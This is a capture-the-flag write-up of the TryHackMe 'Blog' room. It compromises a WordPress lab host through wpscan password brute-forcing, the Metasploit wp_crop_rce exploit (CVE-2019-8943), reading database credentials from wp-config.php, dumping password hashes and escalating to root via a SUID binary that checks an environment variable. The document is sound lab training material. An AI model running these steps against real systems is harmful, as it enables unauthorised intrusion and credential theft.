---
layout: post
title:  "TryHackMe Blog writeup"
date:   2020-12-25 12:59:36 +0200
categories: writeup tryhackme
---

This is a writeup for TryHackMe room [Blog](https://tryhackme.com/room/blog) where you need to hack your way into wordpress using a CVE and weak credentials. 

>Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

## Reconnaissance

Let’s start with a nmap scan:
```
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### SMB enumeration

Let's look at potential anonymous shares:

```
smbmap -H blog.thm            
[+] Guest session    IP: 10.10.183.211:445 Name: 10.10.183.211                                     
   Disk                                                     Permissions Comment
   ----                                                     ----------- -------
   print$                                              NO ACCESS    Printer Drivers
   BillySMB                                            READ, WRITE  Billy's local SMB Share
   IPC$                                                NO ACCESS    IPC Service (blog server (Samba, Ubuntu))
```
There is one but it contains only a rabbit hole (I was expecting to get rickrolled):
```
smbclient \\\\blog.thm\\BillySMB       
Enter WORKGROUP\jari's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Dec 26 12:15:49 2020
  ..                                  D        0  Tue May 26 20:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 21:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 21:13:45 2020
  check-this.png                      N     3082  Tue May 26 21:13:43 2020
```


### Web server enumeration

Let't take a loook at the web site. Oh no, Billy has been laid off. Luckily his mother is there to support him. 
![Smag]({{ site_url }}/assets/blog/web.png)


### Wordpress enumeration

Let's look at the potential vulnerabilities using wpscan. One interesting RCE pops up:

```
wpscan --url http://blog.thm --api-token __REDACTED__ 

Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpscan.com/vulnerabilities/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
```
To be able to exploit this we need an authenticated user. Billy's mother might not have the strongest password, let's see if we can get her credentials.

Enumerate users:
```
wpscan --url http://blog.thm --api-token __REDACTED__ --enumerate u 
kwheel: Karen Wheeler
bjoel: Billy Joel
```


## Gaining entry


wpscan dictionary attack:
```
wpscan --url http://blog.thm --usernames kwheel,bjoel --passwords /usr/share/wordlists/rockyou.txt
[SUCCESS] - kwheel / cutiepie1         
```

Ok nice. Now we can log in as Karen and exploit the vulnerability. Since this vulnerability requires multiple steps it's worth checking if metasploit has a suitable exploit. Luckily there is one:

```
msf5 > search CVE-2019-8943

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
```

Set the few options and open up meterpreter shell. Upgrade it with Python:

```
python -c 'import pty;pty.spawn("/bin/bash")
```

Let's grab wordpress database credentials from `/var/www/wordpress/wp-config.php`:
``` 
/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

Connect to the blog database and get users:

```
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ |
| kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. |
+------------+------------------------------------+
```

While hashcat is running sniff around filesystem. After a lot of searches I check for suid permissions and find one interesting file:

```
find / -perm /4000 2>/dev/null
...
/usr/sbin/checker
...
```
Running it seems to do an admin check:
```
./checker   
Not an Admin
```
Let's see how the check is performed using `ltrace`:

```
ltrace ./checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```
Let's set the variable and try again:
```
ww-data@blog:/usr/sbin$ export admin=true
www-data@blog:/usr/sbin$ ./checker
root@blog:/usr/sbin# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
BOOM! We are root. All there is to do now is grab the flags.
